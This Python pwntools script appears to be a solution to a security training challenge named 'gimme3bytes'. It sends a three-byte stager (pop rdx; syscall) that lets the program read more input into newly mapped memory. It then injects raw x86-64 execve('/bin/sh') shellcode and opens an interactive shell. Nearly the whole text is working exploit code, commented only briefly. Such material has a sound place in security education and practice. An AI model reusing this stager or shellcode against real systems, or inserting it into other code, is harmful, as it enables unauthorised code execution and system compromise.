from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2004)

r = process("./gimme3bytes") 

''' not attaching to remote
b * 0x4011d4 

gdb.attach(r, """
	b * 0x4011f1
	c        
""")
'''
# receive intro
print(r.clean())

input("wait")

''' since a read call was just done with rdx (nbytes) = 3, we can just replace rdx with a higher number (first number in the stack). Then we just syscall since everything else was already setup (it will write the newly mapped memory).
pop rdx
syscall
'''
r.send(b"\x5A\x0F\x05")

input("Proceed to send shellcode")

'''
Now we just send the shellcode, which will be written in the newly mapped memory and executed by main() in the last line.
'''

shellcode = "\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00"

r.send(shellcode)

# Spawn a shell that allows us to interact with the remote program
r.interactive()

